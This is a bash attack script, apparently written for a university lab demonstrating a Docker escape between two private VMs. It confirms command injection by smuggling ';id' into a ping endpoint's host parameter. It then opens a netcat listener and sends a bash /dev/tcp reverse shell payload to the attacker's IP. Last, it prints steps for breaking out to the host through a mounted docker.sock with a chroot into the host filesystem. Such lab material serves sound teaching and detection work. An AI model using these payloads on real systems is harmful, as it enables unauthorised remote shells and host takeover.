#!/bin/bash
# =============================================================
#  attack.sh  -  Attacker Machine (VM2 | 192.168.98.5)
#  Docker Escape Demo | GTU-SET Semester 4
#  Walks through each step of the attack chain interactively.
# =============================================================

VICTIM_IP="192.168.98.4"
ATTACKER_IP="192.168.98.5"
PORT=4444
TARGET="http://${VICTIM_IP}:5000"

YELLOW='\033[1;33m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

banner()  { echo -e "\n${YELLOW}[*] $1${NC}"; }
ok()      { echo -e "${GREEN}[+] $1${NC}"; }
info()    { echo -e "${CYAN}    $1${NC}"; }
pause()   { echo -e "\n${YELLOW}Press ENTER to continue...${NC}"; read -r; }

echo ""
echo -e "${RED}  Docker Escape Demo -- Attack Script${NC}"
echo -e "${RED}  VM2 (Attacker) | 192.168.98.5${NC}"
echo ""
echo -e "  Target  : ${YELLOW}${TARGET}${NC}"
echo -e "  Listen  : ${YELLOW}${ATTACKER_IP}:${PORT}${NC}"
echo ""

# -- STEP 1: Confirm RCE ---------------------------------------
banner "STEP 1 - Confirm Remote Code Execution"
info "Sending: GET /ping?host=8.8.8.8;id"
echo ""

RESPONSE=$(curl -s --max-time 10 "${TARGET}/ping?host=8.8.8.8%3Bid" 2>/dev/null)

if echo "$RESPONSE" | grep -q "uid=0"; then
    ok "RCE confirmed! Response contains uid=0(root)"
    echo ""
    echo "$RESPONSE" | grep "uid=" | head -3
else
    echo -e "${RED}[-] No RCE detected. Is the victim app running? Check VM1.${NC}"
    echo "    Raw response: $RESPONSE"
    exit 1
fi

pause

# -- STEP 2: Reverse Shell -------------------------------------
banner "STEP 2 - Reverse Shell"
info "This script will:"
info "  1. Open a netcat listener on port ${PORT} in a new terminal"
info "  2. Send the reverse shell payload to the victim"
info ""
info "Once the shell connects, run these commands INSIDE the container:"
echo ""
echo -e "    ${CYAN}python3 -c 'import pty; pty.spawn(\"/bin/bash\")'${NC}"
echo -e "    ${CYAN}export TERM=xterm${NC}"
echo -e "    ${CYAN}# Then: Ctrl+Z  ->  stty raw -echo; fg  ->  Enter twice${NC}"
echo ""

pause

# Open listener in a new terminal window (works on Kali with xterm/gnome-terminal)
if command -v xterm &>/dev/null; then
    xterm -title "Netcat Listener [:${PORT}]" -e "nc -lvnp ${PORT}" &
elif command -v gnome-terminal &>/dev/null; then
    gnome-terminal -- bash -c "nc -lvnp ${PORT}; exec bash" &
else
    banner "Could not open a new terminal. Run this manually in another window:"
    echo -e "    ${YELLOW}nc -lvnp ${PORT}${NC}"
    pause
fi

sleep 1

banner "Sending reverse shell payload to victim..."
PAYLOAD="bash+-c+'bash+-i+>%26+/dev/tcp/${ATTACKER_IP}/${PORT}+0>%261'"
curl -s --max-time 5 "${TARGET}/ping?host=8.8.8.8%3B${PAYLOAD}" &>/dev/null &

ok "Payload sent. Watch the listener window for your shell."

pause

# -- STEP 3: Post-exploitation reminder -----------------------
banner "STEP 3 - Inside the Container: Escape via docker.sock"
info "Run these commands in your reverse shell (inside the container):"
echo ""
echo -e "  ${CYAN}# Verify the socket is mounted${NC}"
echo -e "  ${YELLOW}ls -la /var/run/docker.sock${NC}"
echo ""
echo -e "  ${CYAN}# Install Docker CLI inside the container${NC}"
echo -e "  ${YELLOW}apt-get update && apt-get install -y docker.io${NC}"
echo ""
echo -e "  ${CYAN}# Escape: mount host root and write a file${NC}"
echo -e "  ${YELLOW}docker -H unix:///var/run/docker.sock run -d \\"
echo -e "    -v /:/hostfs --rm alpine \\"
echo -e "    chroot /hostfs sh -c 'echo pwned > /tmp/escaped.txt'${NC}"
echo ""
echo -e "  ${CYAN}# Verify on VM1 (host, outside any container):${NC}"
echo -e "  ${YELLOW}cat /tmp/escaped.txt${NC}"
echo ""
echo -e "${GREEN}------------------------------------------${NC}"
echo -e "${GREEN} Attack chain complete if you see 'pwned'. ${NC}"
echo -e "${GREEN}------------------------------------------${NC}"
echo ""
echo -e "  Now switch to VM1 and run ${YELLOW}detect.sh${NC} to show detection."
echo ""